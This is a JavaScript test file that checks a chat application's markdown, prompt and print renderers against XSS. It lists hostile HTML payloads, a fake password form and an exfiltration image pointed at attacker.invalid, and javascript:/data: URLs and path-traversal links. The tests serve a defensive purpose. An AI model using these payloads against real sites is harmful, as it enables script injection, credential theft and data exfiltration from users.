import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdir, readFile, writeFile } from 'node:fs/promises';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import ts from 'typescript';

// Exercise the actual React renderers used by guest/authenticated chats, saved
// and imported transcripts, user prompts, and print exports. No model is called.
const runtime = new URL('../.sites-runtime/xss-rendering-tests/', import.meta.url);
await mkdir(runtime, { recursive: true });
const modules = [
  ['lib/markdown-table.ts', 'markdown-table'],
  ['components/guest/guest-markdown.tsx', 'guest-markdown'],
  ['components/chat/collapsible-prompt.tsx', 'collapsible-prompt'],
  ['components/workspace/conversation-print-content.tsx', 'conversation-print-content'],
];
for (const [path, name] of modules) {
  let source = await readFile(new URL('../' + path, import.meta.url), 'utf8');
  source = source.replace("'../../lib/markdown-table'", "'./markdown-table.mjs'")
    .replace("'../guest/guest-markdown'", "'./guest-markdown.mjs'")
    .replace("import './collapsible-prompt.css';", '');
  await writeFile(new URL(name + '.mjs', runtime), ts.transpileModule(source, {
    compilerOptions: { module: ts.ModuleKind.ESNext, target: ts.ScriptTarget.ES2022, jsx: ts.JsxEmit.ReactJSX },
  }).outputText);
}
const { default: Markdown } = await import(new URL('guest-markdown.mjs', runtime));
const { default: Prompt } = await import(new URL('collapsible-prompt.mjs', runtime));
const { ConversationPrintContent: Print } = await import(new URL('conversation-print-content.mjs', runtime));
const render = (component, props) => renderToStaticMarkup(createElement(component, props));
const hostile = [
  '<script>window.__prismXss = true</script>',
  '<img src=x onerror="window.__prismXss=true">',
  '<svg onload="window.__prismXss=true"><a href="javascript:alert(1)">x</a></svg>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">',
  '</textarea><script>alert(1)</script><textarea>',
  '</div><form action="https://attacker.invalid"><input name="password"></form>',
  '&lt;script&gt;alert(1)&lt;/script&gt;',
];
function assertInert(html) {
  assert.doesNotMatch(html, /<(?:script|img|svg|math|iframe|object|embed|style|form|input|textarea)\b/i);
  for (const tag of html.match(/<[a-z][^>]*>/gi) || []) {
    // Attribute values can legitimately contain escaped payloads. Inspect the
    // actual attribute names without confusing text inside a quoted value.
    assert.doesNotMatch(tag.replace(/"[^"]*"|'[^']*'/g, '""'), /\son[a-z]+\s*=/i);
  }
  assert.doesNotMatch(html, /(?:href|src)="(?:javascript|vbscript|data):/i);
}

test('hostile HTML stays literal in paragraphs, headings, lists, code, and tables', () => {
  for (const payload of hostile) {
    for (const text of [payload, '# ' + payload, '- ' + payload, '**' + payload + '**',
      '`' + payload + '`', '```html\n' + payload + '\n```', '| Content |\n| --- |\n| ' + payload + ' |']) {
      const html = render(Markdown, { text });
      assertInert(html);
      assert.ok(html.includes('&lt;') || html.includes('&amp;lt;'), text);
    }
  }
});

test('prompt and print renderers never interpret user text or saved model output as HTML', () => {
  for (const payload of hostile) {
    assertInert(render(Prompt, { text: payload }));
    assertInert(render(Print, { messages: [
      { id: 'user-\" onmouseover=\"alert(1)', role: 'user', content: payload },
      { id: 'assistant', role: 'assistant', content: payload },
    ] }));
  }
});

test('executable URLs, credentials, control characters and ambiguous internal artifact paths stay text', () => {
  for (const href of [
    'javascript:alert(1)', 'JaVaScRiPt:alert%281%29', 'vbscript:msgbox(1)',
    'data:text/html;base64,PHNjcmlwdD4=', 'blob:https://prism.test/untrusted',
    '//attacker.invalid', '/auth/logout', '/api/artifacts/',
    '/api/artifacts/../settings', '/api/artifacts/%2e%2e/settings',
    '/api/artifacts/file%2f..%2f..%2fauth%2flogout', '/api/artifacts/file%5c..%5cauth',
    '/api/artifacts/id?redirect=https://attacker.invalid', '/api/artifacts/id#fragment',
    '/api/artifacts/id/extra', '/api/artifacts/' + 'a'.repeat(201),
    'https://user:secret@example.test/', 'https://example.test\\@attacker.invalid/',
    'https://example.test/\u0000x', 'https://example.test/\u007fx',
  ]) {
    assert.doesNotMatch(render(Markdown, { text: '[source](' + href + ')' }), /<a\b/, href);
  }
});

test('normal sources and generated download links retain safe navigation and escaped labels', () => {
  for (const href of ['https://example.test/article?q=1&lang=ko', 'http://example.test/source',
    '/api/artifacts/3b6999c5-e663-4128-b536-afb2201324de']) {
    const html = render(Markdown, { text: '[<img src=x onerror=alert> **source**](' + href + ')' });
    assertInert(html);
    assert.match(html, /<a href="/);
    assert.match(html, /target="_blank" rel="noopener noreferrer"/);
    assert.match(html, /&lt;img src=x onerror=alert&gt;/);
    assert.match(html, /<strong>source<\/strong>/);
  }
});

test('image-like model text cannot automatically load a tracking or exfiltration image', () => {
  const html = render(Markdown, { text: '![tracking](https://attacker.invalid/pixel?private=canary)' });
  assert.doesNotMatch(html, /<(?:img|iframe|object|embed)\b/);
  // If interpreted as a source, following it still requires an explicit click.
  assert.match(html, /rel="noopener noreferrer"/);
});
